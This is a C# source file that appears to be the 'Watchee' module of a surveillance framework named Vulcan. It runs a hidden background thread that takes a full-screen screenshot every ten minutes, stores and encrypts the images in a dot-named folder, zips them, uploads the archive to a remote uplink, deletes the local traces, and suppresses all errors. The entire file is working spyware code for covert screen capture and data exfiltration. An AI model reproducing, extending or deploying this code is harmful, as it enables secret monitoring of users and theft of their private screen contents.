using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Threading;
using Ionic.Zip;
using Vulcan.Core;
using Vulcan.Core.Uplink;

namespace ModuleWatchee
{
    public class WatcheeThread
    {
        private Thread watcheeThread;
        private readonly string capturePath;

        private IVulcanUplink uplink = VulcanConfiguration.Instance.PrimaryUplink;

        public WatcheeThread()
        {
            capturePath = VulcanConfiguration.Instance.InstallLocation + "\\.VLCNCAP";

            if (!Directory.Exists(capturePath))
                FileHelper.CreateDirectory(capturePath);

        }

        public void Start()
        {
            watcheeThread = new Thread(record);
            watcheeThread.IsBackground = true;
            watcheeThread.Start();
        }

        private void record()
        {
            while (true)
            {
                try
                {
                    Rectangle bounds = Screen.GetBounds(Point.Empty);
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }

                        string fname = String.Format("{0}\\{1}.jpg", capturePath, Guid.NewGuid().ToString());

                        bitmap.Save(fname, ImageFormat.Jpeg);

                        FileHelper.EncryptRSA(fname);

                    }

                    if (Directory.GetFiles(capturePath).Length > 12)
                    {
                        string arc = string.Format("{0}\\{1}.zip", capturePath, Guid.NewGuid().ToString());
                        using (ZipFile pk = new ZipFile(arc))
                        {
                            foreach (string s in Directory.GetFiles(capturePath))
                            {
                                if (s.EndsWith(".jpg") || s.EndsWith(".key"))
                                {
                                    pk.AddItem(s, Path.GetFileName(s));
                                }
                            }
                            pk.Save();
                        }

                        uplink.SendFile(arc, "screenshots");

                        foreach (string f in Directory.GetFiles(capturePath))
                        {
                            try
                            {
                                File.Delete(f);
                            }
                            catch
                            {
                            }
                        }

                    }
                }
                catch (Exception e)
                {
                }

                Thread.Sleep(600000);

            }
        }
    }
}
